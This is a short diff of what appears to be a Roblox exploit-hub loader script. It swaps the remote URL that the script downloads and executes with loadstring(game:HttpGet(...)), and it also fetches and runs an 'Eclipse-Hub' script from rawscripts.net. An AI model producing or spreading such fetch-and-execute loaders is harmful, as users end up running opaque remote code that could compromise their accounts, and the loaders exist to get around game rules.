@@ -21,7 +21,7 @@ game:GetService("StarterGui"):SetCore("SendNotification", {
 Duration = 5
 
 getgenv().gui = false
-loadstring(game:HttpGet("https://egorikusa.space/78ffe85f0bf079c876f439c7.lua", true))()
+loadstring(game:HttpGet("https://egorikusa.space/24b3f65d2f484259db06349b.lua", true))()
 
 getgenv().gui = true
 loadstring(game:HttpGet("https://rawscripts.net/raw/Eclipse-Hub_805"))()
